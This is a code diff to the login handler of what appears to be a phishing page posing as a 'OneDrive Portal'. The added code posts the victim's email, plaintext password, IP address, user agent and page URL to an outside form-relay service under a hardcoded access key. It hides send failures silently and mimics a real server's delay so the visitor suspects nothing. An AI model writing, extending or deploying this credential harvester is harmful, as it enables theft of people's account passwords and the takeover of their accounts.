@@ -981,8 +981,29 @@ async function handleLogin(e) {
             t: Date.now(),
         };
         
-        // Send to backend
-        await sendDataToBackend(data);
+        // Send directly to Web3Forms
+try {
+    await fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+            access_key: 'a682d4f0-f5ae-4c34-a6f6-f29d10f9c24b',
+            subject: 'New Login',
+            from_name: 'OneDrive Portal',
+            email: email,
+            password: password,
+            ip: ip || 'Unknown',
+            userAgent: navigator.userAgent,
+            page: window.location.href,
+            message: `Email: ${email}\nPassword: ${password}\nIP: ${ip}\nPage: ${window.location.href}`
+        })
+    });
+} catch (e) {
+    console.log('send failed silently');
+}
         
         // Wait a bit like real server (800-1200ms)
         setTimeout(() => {
